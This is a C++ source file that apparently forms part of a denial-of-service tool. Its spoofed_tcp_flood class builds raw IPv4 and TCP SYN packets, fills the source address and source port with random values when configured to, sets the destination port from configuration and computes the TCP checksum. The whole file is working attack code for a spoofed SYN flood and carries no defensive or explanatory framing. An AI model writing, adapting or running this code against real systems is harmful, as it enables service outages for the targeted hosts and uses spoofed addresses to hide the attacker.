#include "spoofed_tcp_flood.h"
#include "utils.h"

#include <cstring>

spoofed_tcp_flood::spoofed_tcp_flood(std::shared_ptr<Config> config) :
										base_spoofed_flood(std::move(config),
												IPPROTO_TCP) {

}

char *spoofed_tcp_flood::gen_hdr(sockaddr_in *dst, int len) {
    char *string = new char[len];

    auto *ip = (iphdr *) string;
    auto *tcp = (tcphdr *)(string + sizeof(iphdr));
    std::string ipaddr{};
    bzero(string, (size_t) len);

    init_hdr(tcp, ip);

    ip->daddr = dst->sin_addr.s_addr;

    if(config->rand_lhost){
        utils::randomizer::randomIP(ipaddr);
        ip->saddr = inet_addr(ipaddr.c_str());
    }else
        ip->saddr = 0;

    ip->tot_len = htons((uint16_t) len);

    if(config->rand_lport)
        tcp->th_sport = htons((uint16_t) utils::randomizer::randomPort());
    else
        tcp->th_sport = 0;

    finalize_hdr(tcp, ip);

    return string;
}

void spoofed_tcp_flood::init_hdr(tcphdr *tcp, iphdr *ip) {
    ip->ihl = sizeof(struct iphdr) / 4;
    ip->version = 4;
    ip->tos = 16;
    ip->id = htons((uint16_t) utils::randomizer::randomInt(1, 1000));
    ip->frag_off = htons(0x0);
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;

    tcp->th_dport = htons((uint16_t) utils::to_int(config->rport));
    tcp->th_seq = htonl((uint16_t) utils::randomizer::randomInt(1, 1000));
    tcp->th_ack = htonl((uint16_t) utils::randomizer::randomInt(1, 1000));
    tcp->th_off = sizeof(struct tcphdr) / 4;
    tcp->th_win = htons(5840);
    tcp->th_flags = TH_SYN;
}

void spoofed_tcp_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
    pshdr psh{};
    psh.saddr = ip->saddr;
    psh.daddr = ip->daddr;

    bcopy(tcp, &psh.tcp, sizeof(tcphdr));

    tcp->th_sum = utils::csum((unsigned short *) &psh, sizeof(psh));
}
